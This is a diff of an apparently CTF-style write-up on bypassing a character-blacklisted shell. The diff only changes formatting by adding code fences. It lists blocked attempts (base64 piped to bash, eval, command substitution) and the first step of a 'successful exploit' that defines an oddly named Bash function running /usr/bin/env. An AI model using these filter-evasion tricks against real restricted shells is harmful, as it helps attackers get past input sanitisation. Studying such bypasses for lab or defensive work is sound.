@@ -48,23 +48,23 @@ Below are documented failed approaches (all blocked due to restricted characters
 
 🔸 Basic Commands:
 
-ls whoami echo hello
+``` ls whoami echo hello ```
 
 🔸 Encodings & Piping:
 
-echo "ls /home" | base64 printf "ls /home\n" | bash
+``` echo "ls /home" | base64 printf "ls /home\n" | bash ```
 
 🔸 Redirection & Variables:
 
-ls /home > /tmp/output.txt cat /tmp/output.txt export CMD="ls /home" eval $CMD
+``` ls /home > /tmp/output.txt cat /tmp/output.txt export CMD="ls /home" eval $CMD ```
 
 🔸 Command Substitution:
 
-$(ls) :; ls /home
+``` $(ls) :; ls /home ```
 
 🔸 Function Definitions (Blocked due to restricted chars like {, /, s):
 
-function foo() { ls /home; } foo
+``` function foo() { ls /home; } foo ```
 
 ## ✅ Successful Exploit
 
@@ -72,7 +72,7 @@ Despite the blacklist, Bash does not clear the environment or function definitio
 
 ### 💡 Step 1: Define a function using allowed characters
 
-UNC_a%%=() {  /usr/bin/env; }
+``` UNC_a%%=() {  /usr/bin/env; } ```
 
 Valid Bash function name
 
